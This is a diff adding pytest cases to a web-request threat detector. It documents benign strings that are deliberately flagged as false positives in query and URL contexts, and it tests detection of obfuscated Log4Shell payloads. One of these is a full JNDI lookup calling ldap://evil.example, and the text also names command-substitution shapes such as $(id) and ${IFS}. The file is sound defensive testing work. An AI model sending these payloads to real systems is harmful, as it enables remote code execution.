@@ -1,6 +1,8 @@
 import time
 from typing import NamedTuple
 
+import pytest
+
 from guard_core.models import SecurityConfig
 from guard_core.sync.handlers.suspatterns_handler import (
     ALL_DETECTION_CATEGORIES,
@@ -2298,3 +2300,81 @@ def test_detection_benchmark_legacy_smoke() -> None:
         f"legacy singleton false-positive rate rose: "
         f"baseline={BASELINE_BENIGN_FALSE_POSITIVE_TOTAL} actual={benign_flagged_total}"
     )
+
+
+_AMBIGUOUS_DOLLAR_SUBSTITUTION_QUERY_URL_KNOWN_FP_REASON = (
+    "a bare single-token $(...)/${...} substitution is deliberately "
+    "context-gated to query_param/url_path so it stays detected there "
+    "(Renzo's ruling, variant a): the jQuery $(id)/$('#x') selector, the "
+    "${HOME} shell-doc var expansion, the Makefile $(CC)/$(CFLAGS) mention, "
+    "and the ${amount} template placeholder are character-identical to that "
+    "attack shape as raw query-string or path-segment values, so they are "
+    "flagged there too, and stay correctly benign in request_body, where "
+    "the branch never fires. Resolved toward recall: detecting $(id)/$(w)/"
+    "$(who)/$(groups)/$(set)/${IFS}-shaped command substitution outweighs "
+    "these five documented, disclosed false positives"
+)
+
+_DOLLAR_SUBSTITUTION_DISCLOSED_FALSE_POSITIVES = [
+    pytest.param(
+        "cmd_injection_shell_docs_var_expansion",
+        "export PATH=${HOME}/bin",
+        id="shell_docs_var_expansion",
+    ),
+    pytest.param(
+        "template_benign_dollar_brace_var",
+        "Set the amount with ${amount} in the template.",
+        id="template_dollar_brace_var",
+    ),
+    pytest.param(
+        "template_benign_makefile_variable",
+        "The Makefile references $(CC) and $(CFLAGS) for the compiler.",
+        id="template_makefile_variable",
+    ),
+    pytest.param(
+        "cmd_injection_jquery_selector_bare_id_call",
+        "$(id).addClass('active');",
+        id="jquery_selector_bare_id_call",
+    ),
+    pytest.param(
+        "cmd_injection_jquery_selector_hash_id_call",
+        "$('#submit-button').on('click', handleSubmit);",
+        id="jquery_selector_hash_id_call",
+    ),
+]
+
+
+@pytest.mark.parametrize(
+    "case_id, payload", _DOLLAR_SUBSTITUTION_DISCLOSED_FALSE_POSITIVES
+)
+@pytest.mark.parametrize("context", ["query_param", "url_path"])
+def test_dollar_substitution_disclosed_false_positive_detected(
+    case_id: str, payload: str, context: str
+) -> None:
+    result = _PRODUCTION_MANAGER.detect(
+        content=payload, ip_address="203.0.113.9", context=context
+    )
+    assert result["is_threat"] is True, (
+        f"{case_id} expected to be a disclosed false positive in {context}: "
+        f"{_AMBIGUOUS_DOLLAR_SUBSTITUTION_QUERY_URL_KNOWN_FP_REASON}"
+    )
+
+
+_LOG4SHELL_URL_PATH_BONUS_PAYLOADS = [
+    pytest.param("${lower:j}ndi", id="log4shell_obfuscated_lower_bare"),
+    pytest.param("${::-j}ndi", id="log4shell_obfuscated_default_value_bare"),
+    pytest.param(
+        "${${lower:j}ndi:ldap://evil.example/a}",
+        id="log4shell_obfuscated_nested_full_exploit",
+    ),
+]
+
+
+@pytest.mark.parametrize("payload", _LOG4SHELL_URL_PATH_BONUS_PAYLOADS)
+def test_log4shell_obfuscated_payload_detected_in_url_path(
+    payload: str,
+) -> None:
+    result = _PRODUCTION_MANAGER.detect(
+        content=payload, ip_address="203.0.113.9", context="url_path"
+    )
+    assert result["is_threat"] is True
